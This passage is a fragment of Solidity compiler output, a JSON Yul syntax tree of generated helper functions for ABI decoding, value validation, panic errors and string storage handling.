"nativeSrc":"300:28:10","nodeType":"YulBlock","src":"300:28:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:10","nodeType":"YulLiteral","src":"317:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:10","nodeType":"YulLiteral","src":"320:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:10","nodeType":"YulIdentifier","src":"310:6:10"},"nativeSrc":"310:12:10","nodeType":"YulFunctionCall","src":"310:12:10"},"nativeSrc":"310:12:10","nodeType":"YulExpressionStatement","src":"310:12:10"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:10","nodeType":"YulFunctionDefinition","src":"211:117:10"},{"body":{"nativeSrc":"379:32:10","nodeType":"YulBlock","src":"379:32:10","statements":[{"nativeSrc":"389:16:10","nodeType":"YulAssignment","src":"389:16:10","value":{"name":"value","nativeSrc":"400:5:10","nodeType":"YulIdentifier","src":"400:5:10"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:10","nodeType":"YulIdentifier","src":"389:7:10"}]}]},"name":"cleanup_t_uint256","nativeSrc":"334:77:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:10","nodeType":"YulTypedName","src":"361:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:10","nodeType":"YulTypedName","src":"371:7:10","type":""}],"src":"334:77:10"},{"body":{"nativeSrc":"460:79:10","nodeType":"YulBlock","src":"460:79:10","statements":[{"body":{"nativeSrc":"517:16:10","nodeType":"YulBlock","src":"517:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"526:1:10","nodeType":"YulLiteral","src":"526:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"529:1:10","nodeType":"YulLiteral","src":"529:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"519:6:10","nodeType":"YulIdentifier","src":"519:6:10"},"nativeSrc":"519:12:10","nodeType":"YulFunctionCall","src":"519:12:10"},"nativeSrc":"519:12:10","nodeType":"YulExpressionStatement","src":"519:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"483:5:10","nodeType":"YulIdentifier","src":"483:5:10"},{"arguments":[{"name":"value","nativeSrc":"508:5:10","nodeType":"YulIdentifier","src":"508:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"490:17:10","nodeType":"YulIdentifier","src":"490:17:10"},"nativeSrc":"490:24:10","nodeType":"YulFunctionCall","src":"490:24:10"}],"functionName":{"name":"eq","nativeSrc":"480:2:10","nodeType":"YulIdentifier","src":"480:2:10"},"nativeSrc":"480:35:10","nodeType":"YulFunctionCall","src":"480:35:10"}],"functionName":{"name":"iszero","nativeSrc":"473:6:10","nodeType":"YulIdentifier","src":"473:6:10"},"nativeSrc":"473:43:10","nodeType":"YulFunctionCall","src":"473:43:10"},"nativeSrc":"470:63:10","nodeType":"YulIf","src":"470:63:10"}]},"name":"validator_revert_t_uint256","nativeSrc":"417:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"453:5:10","nodeType":"YulTypedName","src":"453:5:10","type":""}],"src":"417:122:10"},{"body":{"nativeSrc":"608:80:10","nodeType":"YulBlock","src":"608:80:10","statements":[{"nativeSrc":"618:22:10","nodeType":"YulAssignment","src":"618:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"633:6:10","nodeType":"YulIdentifier","src":"633:6:10"}],"functionName":{"name":"mload","nativeSrc":"627:5:10","nodeType":"YulIdentifier","src":"627:5:10"},"nativeSrc":"627:13:10","nodeType":"YulFunctionCall","src":"627:13:10"},"variableNames":[{"name":"value","nativeSrc":"618:5:10","nodeType":"YulIdentifier","src":"618:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"676:5:10","nodeType":"YulIdentifier","src":"676:5:10"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"649:26:10","nodeType":"YulIdentifier","src":"649:26:10"},"nativeSrc":"649:33:10","nodeType":"YulFunctionCall","src":"649:33:10"},"nativeSrc":"649:33:10","nodeType":"YulExpressionStatement","src":"649:33:10"}]},"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"545:143:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"586:6:10","nodeType":"YulTypedName","src":"586:6:10","type":""},{"name":"end","nativeSrc":"594:3:10","nodeType":"YulTypedName","src":"594:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"602:5:10","nodeType":"YulTypedName","src":"602:5:10","type":""}],"src":"545:143:10"},{"body":{"nativeSrc":"739:81:10","nodeType":"YulBlock","src":"739:81:10","statements":[{"nativeSrc":"749:65:10","nodeType":"YulAssignment","src":"749:65:10","value":{"arguments":[{"name":"value","nativeSrc":"764:5:10","nodeType":"YulIdentifier","src":"764:5:10"},{"kind":"number","nativeSrc":"771:42:10","nodeType":"YulLiteral","src":"771:42:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"760:3:10","nodeType":"YulIdentifier","src":"760:3:10"},"nativeSrc":"760:54:10","nodeType":"YulFunctionCall","src":"760:54:10"},"variableNames":[{"name":"cleaned","nativeSrc":"749:7:10","nodeType":"YulIdentifier","src":"749:7:10"}]}]},"name":"cleanup_t_uint160","nativeSrc":"694:126:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"721:5:10","nodeType":"YulTypedName","src":"721:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"731:7:10","nodeType":"YulTypedName","src":"731:7:10","type":""}],"src":"694:126:10"},{"body":{"nativeSrc":"871:51:10","nodeType":"YulBlock","src":"871:51:10","statements":[{"nativeSrc":"881:35:10","nodeType":"YulAssignment","src":"881:35:10","value":{"arguments":[{"name":"value","nativeSrc":"910:5:10","nodeType":"YulIdentifier","src":"910:5:10"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"892:17:10","nodeType":"YulIdentifier","src":"892:17:10"},"nativeSrc":"892:24:10","nodeType":"YulFunctionCall","src":"892:24:10"},"variableNames":[{"name":"cleaned","nativeSrc":"881:7:10","nodeType":"YulIdentifier","src":"881:7:10"}]}]},"name":"cleanup_t_address","nativeSrc":"826:96:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"853:5:10","nodeType":"YulTypedName","src":"853:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"863:7:10","nodeType":"YulTypedName","src":"863:7:10","type":""}],"src":"826:96:10"},{"body":{"nativeSrc":"971:79:10","nodeType":"YulBlock","src":"971:79:10","statements":[{"body":{"nativeSrc":"1028:16:10","nodeType":"YulBlock","src":"1028:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1037:1:10","nodeType":"YulLiteral","src":"1037:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"1040:1:10","nodeType":"YulLiteral","src":"1040:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"1030:6:10","nodeType":"YulIdentifier","src":"1030:6:10"},"nativeSrc":"1030:12:10","nodeType":"YulFunctionCall","src":"1030:12:10"},"nativeSrc":"1030:12:10","nodeType":"YulExpressionStatement","src":"1030:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"994:5:10","nodeType":"YulIdentifier","src":"994:5:10"},{"arguments":[{"name":"value","nativeSrc":"1019:5:10","nodeType":"YulIdentifier","src":"1019:5:10"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"1001:17:10","nodeType":"YulIdentifier","src":"1001:17:10"},"nativeSrc":"1001:24:10","nodeType":"YulFunctionCall","src":"1001:24:10"}],"functionName":{"name":"eq","nativeSrc":"991:2:10","nodeType":"YulIdentifier","src":"991:2:10"},"nativeSrc":"991:35:10","nodeType":"YulFunctionCall","src":"991:35:10"}],"functionName":{"name":"iszero","nativeSrc":"984:6:10","nodeType":"YulIdentifier","src":"984:6:10"},"nativeSrc":"984:43:10","nodeType":"YulFunctionCall","src":"984:43:10"},"nativeSrc":"981:63:10","nodeType":"YulIf","src":"981:63:10"}]},"name":"validator_revert_t_address","nativeSrc":"928:122:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"964:5:10","nodeType":"YulTypedName","src":"964:5:10","type":""}],"src":"928:122:10"},{"body":{"nativeSrc":"1119:80:10","nodeType":"YulBlock","src":"1119:80:10","statements":[{"nativeSrc":"1129:22:10","nodeType":"YulAssignment","src":"1129:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"1144:6:10","nodeType":"YulIdentifier","src":"1144:6:10"}],"functionName":{"name":"mload","nativeSrc":"1138:5:10","nodeType":"YulIdentifier","src":"1138:5:10"},"nativeSrc":"1138:13:10","nodeType":"YulFunctionCall","src":"1138:13:10"},"variableNames":[{"name":"value","nativeSrc":"1129:5:10","nodeType":"YulIdentifier","src":"1129:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"1187:5:10","nodeType":"YulIdentifier","src":"1187:5:10"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"1160:26:10","nodeType":"YulIdentifier","src":"1160:26:10"},"nativeSrc":"1160:33:10","nodeType":"YulFunctionCall","src":"1160:33:10"},"nativeSrc":"1160:33:10","nodeType":"YulExpressionStatement","src":"1160:33:10"}]},"name":"abi_decode_t_address_fromMemory","nativeSrc":"1056:143:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"1097:6:10","nodeType":"YulTypedName","src":"1097:6:10","type":""},{"name":"end","nativeSrc":"1105:3:10","nodeType":"YulTypedName","src":"1105:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"1113:5:10","nodeType":"YulTypedName","src":"1113:5:10","type":""}],"src":"1056:143:10"},{"body":{"nativeSrc":"1299:413:10","nodeType":"YulBlock","src":"1299:413:10","statements":[{"body":{"nativeSrc":"1345:83:10","nodeType":"YulBlock","src":"1345:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"1347:77:10","nodeType":"YulIdentifier","src":"1347:77:10"},"nativeSrc":"1347:79:10","nodeType":"YulFunctionCall","src":"1347:79:10"},"nativeSrc":"1347:79:10","nodeType":"YulExpressionStatement","src":"1347:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"1320:7:10","nodeType":"YulIdentifier","src":"1320:7:10"},{"name":"headStart","nativeSrc":"1329:9:10","nodeType":"YulIdentifier","src":"1329:9:10"}],"functionName":{"name":"sub","nativeSrc":"1316:3:10","nodeType":"YulIdentifier","src":"1316:3:10"},"nativeSrc":"1316:23:10","nodeType":"YulFunctionCall","src":"1316:23:10"},{"kind":"number","nativeSrc":"1341:2:10","nodeType":"YulLiteral","src":"1341:2:10","type":"","value":"64"}],"functionName":{"name":"slt","nativeSrc":"1312:3:10","nodeType":"YulIdentifier","src":"1312:3:10"},"nativeSrc":"1312:32:10","nodeType":"YulFunctionCall","src":"1312:32:10"},"nativeSrc":"1309:119:10","nodeType":"YulIf","src":"1309:119:10"},{"nativeSrc":"1438:128:10","nodeType":"YulBlock","src":"1438:128:10","statements":[{"nativeSrc":"1453:15:10","nodeType":"YulVariableDeclaration","src":"1453:15:10","value":{"kind":"number","nativeSrc":"1467:1:10","nodeType":"YulLiteral","src":"1467:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1457:6:10","nodeType":"YulTypedName","src":"1457:6:10","type":""}]},{"nativeSrc":"1482:74:10","nodeType":"YulAssignment","src":"1482:74:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1528:9:10","nodeType":"YulIdentifier","src":"1528:9:10"},{"name":"offset","nativeSrc":"1539:6:10","nodeType":"YulIdentifier","src":"1539:6:10"}],"functionName":{"name":"add","nativeSrc":"1524:3:10","nodeType":"YulIdentifier","src":"1524:3:10"},"nativeSrc":"1524:22:10","nodeType":"YulFunctionCall","src":"1524:22:10"},{"name":"dataEnd","nativeSrc":"1548:7:10","nodeType":"YulIdentifier","src":"1548:7:10"}],"functionName":{"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"1492:31:10","nodeType":"YulIdentifier","src":"1492:31:10"},"nativeSrc":"1492:64:10","nodeType":"YulFunctionCall","src":"1492:64:10"},"variableNames":[{"name":"value0","nativeSrc":"1482:6:10","nodeType":"YulIdentifier","src":"1482:6:10"}]}]},{"nativeSrc":"1576:129:10","nodeType":"YulBlock","src":"1576:129:10","statements":[{"nativeSrc":"1591:16:10","nodeType":"YulVariableDeclaration","src":"1591:16:10","value":{"kind":"number","nativeSrc":"1605:2:10","nodeType":"YulLiteral","src":"1605:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"1595:6:10","nodeType":"YulTypedName","src":"1595:6:10","type":""}]},{"nativeSrc":"1621:74:10","nodeType":"YulAssignment","src":"1621:74:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1667:9:10","nodeType":"YulIdentifier","src":"1667:9:10"},{"name":"offset","nativeSrc":"1678:6:10","nodeType":"YulIdentifier","src":"1678:6:10"}],"functionName":{"name":"add","nativeSrc":"1663:3:10","nodeType":"YulIdentifier","src":"1663:3:10"},"nativeSrc":"1663:22:10","nodeType":"YulFunctionCall","src":"1663:22:10"},{"name":"dataEnd","nativeSrc":"1687:7:10","nodeType":"YulIdentifier","src":"1687:7:10"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nativeSrc":"1631:31:10","nodeType":"YulIdentifier","src":"1631:31:10"},"nativeSrc":"1631:64:10","nodeType":"YulFunctionCall","src":"1631:64:10"},"variableNames":[{"name":"value1","nativeSrc":"1621:6:10","nodeType":"YulIdentifier","src":"1621:6:10"}]}]}]},"name":"abi_decode_tuple_t_uint256t_address_fromMemory","nativeSrc":"1205:507:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1261:9:10","nodeType":"YulTypedName","src":"1261:9:10","type":""},{"name":"dataEnd","nativeSrc":"1272:7:10","nodeType":"YulTypedName","src":"1272:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"1284:6:10","nodeType":"YulTypedName","src":"1284:6:10","type":""},{"name":"value1","nativeSrc":"1292:6:10","nodeType":"YulTypedName","src":"1292:6:10","type":""}],"src":"1205:507:10"},{"body":{"nativeSrc":"1777:40:10","nodeType":"YulBlock","src":"1777:40:10","statements":[{"nativeSrc":"1788:22:10","nodeType":"YulAssignment","src":"1788:22:10","value":{"arguments":[{"name":"value","nativeSrc":"1804:5:10","nodeType":"YulIdentifier","src":"1804:5:10"}],"functionName":{"name":"mload","nativeSrc":"1798:5:10","nodeType":"YulIdentifier","src":"1798:5:10"},"nativeSrc":"1798:12:10","nodeType":"YulFunctionCall","src":"1798:12:10"},"variableNames":[{"name":"length","nativeSrc":"1788:6:10","nodeType":"YulIdentifier","src":"1788:6:10"}]}]},"name":"array_length_t_string_memory_ptr","nativeSrc":"1718:99:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1760:5:10","nodeType":"YulTypedName","src":"1760:5:10","type":""}],"returnVariables":[{"name":"length","nativeSrc":"1770:6:10","nodeType":"YulTypedName","src":"1770:6:10","type":""}],"src":"1718:99:10"},{"body":{"nativeSrc":"1851:152:10","nodeType":"YulBlock","src":"1851:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1868:1:10","nodeType":"YulLiteral","src":"1868:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"1871:77:10","nodeType":"YulLiteral","src":"1871:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"1861:6:10","nodeType":"YulIdentifier","src":"1861:6:10"},"nativeSrc":"1861:88:10","nodeType":"YulFunctionCall","src":"1861:88:10"},"nativeSrc":"1861:88:10","nodeType":"YulExpressionStatement","src":"1861:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1965:1:10","nodeType":"YulLiteral","src":"1965:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"1968:4:10","nodeType":"YulLiteral","src":"1968:4:10","type":"","value":"0x41"}],"functionName":{"name":"mstore","nativeSrc":"1958:6:10","nodeType":"YulIdentifier","src":"1958:6:10"},"nativeSrc":"1958:15:10","nodeType":"YulFunctionCall","src":"1958:15:10"},"nativeSrc":"1958:15:10","nodeType":"YulExpressionStatement","src":"1958:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1989:1:10","nodeType":"YulLiteral","src":"1989:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"1992:4:10","nodeType":"YulLiteral","src":"1992:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"1982:6:10","nodeType":"YulIdentifier","src":"1982:6:10"},"nativeSrc":"1982:15:10","nodeType":"YulFunctionCall","src":"1982:15:10"},"nativeSrc":"1982:15:10","nodeType":"YulExpressionStatement","src":"1982:15:10"}]},"name":"panic_error_0x41","nativeSrc":"1823:180:10","nodeType":"YulFunctionDefinition","src":"1823:180:10"},{"body":{"nativeSrc":"2037:152:10","nodeType":"YulBlock","src":"2037:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"2054:1:10","nodeType":"YulLiteral","src":"2054:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2057:77:10","nodeType":"YulLiteral","src":"2057:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"2047:6:10","nodeType":"YulIdentifier","src":"2047:6:10"},"nativeSrc":"2047:88:10","nodeType":"YulFunctionCall","src":"2047:88:10"},"nativeSrc":"2047:88:10","nodeType":"YulExpressionStatement","src":"2047:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2151:1:10","nodeType":"YulLiteral","src":"2151:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"2154:4:10","nodeType":"YulLiteral","src":"2154:4:10","type":"","value":"0x22"}],"functionName":{"name":"mstore","nativeSrc":"2144:6:10","nodeType":"YulIdentifier","src":"2144:6:10"},"nativeSrc":"2144:15:10","nodeType":"YulFunctionCall","src":"2144:15:10"},"nativeSrc":"2144:15:10","nodeType":"YulExpressionStatement","src":"2144:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2175:1:10","nodeType":"YulLiteral","src":"2175:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2178:4:10","nodeType":"YulLiteral","src":"2178:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"2168:6:10","nodeType":"YulIdentifier","src":"2168:6:10"},"nativeSrc":"2168:15:10","nodeType":"YulFunctionCall","src":"2168:15:10"},"nativeSrc":"2168:15:10","nodeType":"YulExpressionStatement","src":"2168:15:10"}]},"name":"panic_error_0x22","nativeSrc":"2009:180:10","nodeType":"YulFunctionDefinition","src":"2009:180:10"},{"body":{"nativeSrc":"2246:269:10","nodeType":"YulBlock","src":"2246:269:10","statements":[{"nativeSrc":"2256:22:10","nodeType":"YulAssignment","src":"2256:22:10","value":{"arguments":[{"name":"data","nativeSrc":"2270:4:10","nodeType":"YulIdentifier","src":"2270:4:10"},{"kind":"number","nativeSrc":"2276:1:10","nodeType":"YulLiteral","src":"2276:1:10","type":"","value":"2"}],"functionName":{"name":"div","nativeSrc":"2266:3:10","nodeType":"YulIdentifier","src":"2266:3:10"},"nativeSrc":"2266:12:10","nodeType":"YulFunctionCall","src":"2266:12:10"},"variableNames":[{"name":"length","nativeSrc":"2256:6:10","nodeType":"YulIdentifier","src":"2256:6:10"}]},{"nativeSrc":"2287:38:10","nodeType":"YulVariableDeclaration","src":"2287:38:10","value":{"arguments":[{"name":"data","nativeSrc":"2317:4:10","nodeType":"YulIdentifier","src":"2317:4:10"},{"kind":"number","nativeSrc":"2323:1:10","nodeType":"YulLiteral","src":"2323:1:10","type":"","value":"1"}],"functionName":{"name":"and","nativeSrc":"2313:3:10","nodeType":"YulIdentifier","src":"2313:3:10"},"nativeSrc":"2313:12:10","nodeType":"YulFunctionCall","src":"2313:12:10"},"variables":[{"name":"outOfPlaceEncoding","nativeSrc":"2291:18:10","nodeType":"YulTypedName","src":"2291:18:10","type":""}]},{"body":{"nativeSrc":"2364:51:10","nodeType":"YulBlock","src":"2364:51:10","statements":[{"nativeSrc":"2378:27:10","nodeType":"YulAssignment","src":"2378:27:10","value":{"arguments":[{"name":"length","nativeSrc":"2392:6:10","nodeType":"YulIdentifier","src":"2392:6:10"},{"kind":"number","nativeSrc":"2400:4:10","nodeType":"YulLiteral","src":"2400:4:10","type":"","value":"0x7f"}],"functionName":{"name":"and","nativeSrc":"2388:3:10","nodeType":"YulIdentifier","src":"2388:3:10"},"nativeSrc":"2388:17:10","nodeType":"YulFunctionCall","src":"2388:17:10"},"variableNames":[{"name":"length","nativeSrc":"2378:6:10","nodeType":"YulIdentifier","src":"2378:6:10"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"2344:18:10","nodeType":"YulIdentifier","src":"2344:18:10"}],"functionName":{"name":"iszero","nativeSrc":"2337:6:10","nodeType":"YulIdentifier","src":"2337:6:10"},"nativeSrc":"2337:26:10","nodeType":"YulFunctionCall","src":"2337:26:10"},"nativeSrc":"2334:81:10","nodeType":"YulIf","src":"2334:81:10"},{"body":{"nativeSrc":"2467:42:10","nodeType":"YulBlock","src":"2467:42:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nativeSrc":"2481:16:10","nodeType":"YulIdentifier","src":"2481:16:10"},"nativeSrc":"2481:18:10","nodeType":"YulFunctionCall","src":"2481:18:10"},"nativeSrc":"2481:18:10","nodeType":"YulExpressionStatement","src":"2481:18:10"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"2431:18:10","nodeType":"YulIdentifier","src":"2431:18:10"},{"arguments":[{"name":"length","nativeSrc":"2454:6:10","nodeType":"YulIdentifier","src":"2454:6:10"},{"kind":"number","nativeSrc":"2462:2:10","nodeType":"YulLiteral","src":"2462:2:10","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"2451:2:10","nodeType":"YulIdentifier","src":"2451:2:10"},"nativeSrc":"2451:14:10","nodeType":"YulFunctionCall","src":"2451:14:10"}],"functionName":{"name":"eq","nativeSrc":"2428:2:10","nodeType":"YulIdentifier","src":"2428:2:10"},"nativeSrc":"2428:38:10","nodeType":"YulFunctionCall","src":"2428:38:10"},"nativeSrc":"2425:84:10","nodeType":"YulIf","src":"2425:84:10"}]},"name":"extract_byte_array_length","nativeSrc":"2195:320:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"2230:4:10","nodeType":"YulTypedName","src":"2230:4:10","type":""}],"returnVariables":[{"name":"length","nativeSrc":"2239:6:10","nodeType":"YulTypedName","src":"2239:6:10","type":""}],"src":"2195:320:10"},{"body":{"nativeSrc":"2575:87:10","nodeType":"YulBlock","src":"2575:87:10","statements":[{"nativeSrc":"2585:11:10","nodeType":"YulAssignment","src":"2585:11:10","value":{"name":"ptr","nativeSrc":"2593:3:10","nodeType":"YulIdentifier","src":"2593:3:10"},"variableNames":[{"name":"data","nativeSrc":"2585:4:10","nodeType":"YulIdentifier","src":"2585:4:10"}]},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2613:1:10","nodeType":"YulLiteral","src":"2613:1:10","type":"","value":"0"},{"name":"ptr","nativeSrc":"2616:3:10","nodeType":"YulIdentifier","src":"2616:3:10"}],"functionName":{"name":"mstore","nativeSrc":"2606:6:10","nodeType":"YulIdentifier","src":"2606:6:10"},"nativeSrc":"2606:14:10","nodeType":"YulFunctionCall","src":"2606:14:10"},"nativeSrc":"2606:14:10","nodeType":"YulExpressionStatement","src":"2606:14:10"},{"nativeSrc":"2629:26:10","nodeType":"YulAssignment","src":"2629:26:10","value":{"arguments":[{"kind":"number","nativeSrc":"2647:1:10","nodeType":"YulLiteral","src":"2647:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"2650:4:10","nodeType":"YulLiteral","src":"2650:4:10","type":"","value":"0x20"}],"functionName":{"name":"keccak256","nativeSrc":"2637:9:10","nodeType":"YulIdentifier","src":"2637:9:10"},"nativeSrc":"2637:18:10","nodeType":"YulFunctionCall","src":"2637:18:10"},"variableNames":[{"name":"data","nativeSrc":"2629:4:10","nodeType":"YulIdentifier","src":"2629:4:10"}]}]},"name":"array_dataslot_t_string_storage","nativeSrc":"2521:141:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"ptr","nativeSrc":"2562:3:10","nodeType":"YulTypedName","src":"2562:3:10","type":""}],"returnVariables":[{"name":"data","nativeSrc":"2570:4:10","nodeType":"YulTypedName","src":"2570:4:10","type":""}],"src":"2521:141:10"},{"body":{"nativeSrc":"2712:49:10","nodeType":"YulBlock","src":"2712:49:10","statements":[{"nativeSrc":"2722:33:10","nodeType":"YulAssignment","src":"2722:33:10","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"2740:5:10","nodeType":"YulIdentifier","src":"2740:5:10"},{"kind":"number","nativeSrc":"2747:2:10","nodeType":"YulLiteral","src":"2747:2:10","type":"","value":"31"}],"functionName":{"name":"add","nativeSrc":"2736:3:10","nodeType":"YulIdentifier","src":"2736:3:10"},"nativeSrc":"2736:14:10","nodeType":"YulFunctionCall","src":"2736:14:10"},{"kind":"number","nativeSrc":"2752:2:10","nodeType":"YulLiteral","src":"2752:2:10","type":"","value":"32"}],"functionName":{"name":"div","nativeSrc":"2732:3:10","nodeType":"YulIdentifier","src":"2732:3:10"},"nativeSrc":"2732:23:10","nodeType":"YulFunctionCall","src":"2732:23:10"},"variableNames":[{"name":"result","nativeSrc":"2722:6:10","nodeType":"YulIdentifier","src":"2722:6:10"}]}]},"name":"divide_by_32_ceil","nativeSrc":"2668:93:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2695:5:10","nodeType":"YulTypedName","src":"2695:5:10","type":""}],"returnVariables":[{"name":"result","nativeSrc":"2705:6:10","nodeType":"YulTypedName","src":"2705:6:10","type":""}],"src":"2668:93:10"},{"body":{"nativeSrc":"2820:54:10","nodeType":"YulBlock","src":"2820:54:10","statements":[{"nativeSrc":"2830:37:10","nodeType":"YulAssignment","src":"2830:37:10","value":{"arguments":[{"name":"bits","nativeSrc":"2855:4:10","nodeType":"YulIdentifier","src":"2855:4:10"},{"name":"value","nativeSrc":"2861:5:10","nodeType":"YulIdentifier","src":"2861:5:10"}],"functionName":{"name":"shl","nativeSrc":"2851:3:10","nodeType":"YulIdentifier","src":"2851:3:10"},"nativeSrc":"2851:16:10","nodeType":"YulFunctionCall","src":"2851:16:10"},"variableNames":[{"name":"newValue","nativeSrc":"2830:8:10","nodeType":"YulIdentifier","src":"2830:8:10"}]}]},"name":"shift_left_dynamic","nativeSrc":"2767:107:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"bits","nativeSrc":"2795:4:10","nodeType":"YulTypedName","src":"2795:4:10","type":""},{"name":"value","nativeSrc":"2801:5:10","nodeType":"YulTypedName","src":"2801:5:10","type":""}],"returnVariables":[{"name":"newValue","nativeSrc":"2811:8:10","nodeType":"YulTypedName","src":"2811:8:10","type":""}],"src":"2767:107:10"},{"body":{"nativeSrc":"2956:317:10","nodeType":"YulBlock","src":"2956:317:10","statements":[{"nativeSrc":"2966:35:10","nodeType":"YulVariableDeclaration","src":"2966:35:10","value":{"arguments":[{"name":"shiftBytes","nativeSrc":"2987:10:10","nodeType":"YulIdentifier","src":"2987:10:10"},{"kind":"number","nativeSrc":"2999:1:10","nodeType":"YulLiteral","src":"2999:1:10","type":"","value":"8"}],"functionName":{"name":"mul","nativeSrc":"2983:3:10","nodeType":"YulIdentifier","src":"2983:3:10"},"nativeSrc":"2983:18:10","nodeType":"YulFunctionCall","src":"2983:18:10"},"variables":[{"name":"shiftBits","nativeSrc":"2970:9:10","nodeType":"YulTypedName","src":"2970:9:10","type":""}]},{"nativeSrc":"3010:109:10","nodeType":"YulVariableDeclaration","src":"3010:109:10","value":{"arguments":[{"name":"shiftBits","nativeSrc":"3041:9:10","nodeType":"YulIdentifier","src":"3041:9:10"},{"kind":"number","nativeSrc":"3052:66:10","nodeType":"YulLiteral","src":"3052:66:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"shift_left_dynamic","nativeSrc":"3022:18:10","nodeType":"YulIdentifier","src":"3022:18:10"},"nativeSrc":"3022:97:10","nodeType":"YulFunctionCall","src":"3022:97:10"},"variables":[{"name":"mask","nativeSrc":"3014:4:10","nodeType":"YulTypedName","src":"3014:4:10","type":""}]},{"nativeSrc":"3128:51:10","nodeType":"YulAssignment","src":"3128:51:10","value":{"arguments":[{"name":"shiftBits","nativeSrc":"3159:9:10","nodeType":"YulIdentifier","src":"3159:9:10"},{"name":"toInsert","nativeSrc":"3170:8:10","nodeType":"YulIdentifier","src":"3170:8:10"}],"functionName":{"name":"shift_left_dynamic","nativeSrc":"3140:18:10","nodeType":"YulIdentifier","src":"3140:18:10"},"nativeSrc":"3140:39:10","nodeType":"YulFunctionCall","src":"3140:39:10"},"variableNames":[{"name":"toInsert","nativeSrc":"3128:8:10","nodeType":"YulIdentifier","src":"3128:8:10"}]},{"nativeSrc":"3188:30:10","nodeType":"YulAssignment","src":"3188:30:10","value":{"arguments":[{"name":"value","nativeSrc":"3201:5:10","nodeType":"YulIdentifier","src":"3201:5:10"},{"arguments":[{"name":"mask","nativeSrc":"3212:4:10","nod